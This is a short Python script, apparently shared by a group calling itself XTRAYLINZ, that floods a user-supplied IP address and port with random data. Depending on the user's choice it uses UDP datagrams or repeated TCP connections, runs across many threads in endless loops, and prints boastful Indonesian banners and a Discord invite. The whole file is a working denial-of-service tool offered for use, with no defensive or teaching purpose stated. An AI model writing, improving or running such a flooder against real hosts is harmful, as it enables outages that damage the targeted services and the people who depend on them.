#!/usr/bin/env python3
import random
import socket
import threading

print       (" - - > XTRAYLINZ COMMUNITY NIH BOS!! < - - ")
print       (" - - > NGERI ABIEZZZ !!!! < - - ")
print       (" - - > XTraylinz#0965 <- - ")                                   
print       (" - - > GATERIMA PM AJA ANJING !! < - - ")
print       (" - - > KOMUNITAS GUA? DIBAWAH TOD < - - ")
print       (" - - > https://discord.gg/CEbs6UFgga < - - ")
print       (" - - > GA JOIN = YATIM KATA ILHAM  < - - ")
    
ip = str(input("  Ip:"))
port = int(input(" Port:"))
choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
times = int(input(" Paket Nya Mau Berapa:"))
threads = int(input(" Pelor Nya Tembakin Berapa:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" XTRAYLINZ COMMUNITY NIH DEK, BANTAI EVERYBODY ")
		except:
			print("[!] MAMPUS")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" XTRAYLINZ COMMUNITY NIH DEK, BANTAI EVERYBODY ")
		except:
			s.close()
			print("[*] MAMPUS")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()